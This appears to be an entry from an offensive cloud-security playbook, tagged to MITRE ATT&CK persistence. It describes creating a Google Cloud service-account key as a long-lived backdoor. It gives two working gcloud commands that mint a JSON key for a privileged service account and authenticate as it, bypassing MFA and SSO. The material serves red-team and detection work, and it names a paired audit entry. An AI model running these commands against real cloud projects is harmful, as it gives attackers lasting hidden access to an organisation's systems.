---
id: gcp-sa-key
title: GCP service-account key creation (long-lived backdoor)
section: GCP / cloud IAM
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098.001]
platform: [cloud]
source: GCP IAM abuse (service-account key persistence)
pair: gcp-sa-key-audit
---

With `iam.serviceAccountKeys.create` on a privileged service account, mint a
user-managed JSON key and authenticate as that SA from anywhere — long-lived, no
MFA, outside the org's SSO controls. The classic GCP persistence/privesc pivot
(Google recommends disabling user-managed keys for exactly this reason).
(Cloud — no slots.)

```sh
gcloud iam service-accounts keys create key.json --iam-account <sa>@<project>.iam.gserviceaccount.com
gcloud auth activate-service-account --key-file key.json
```
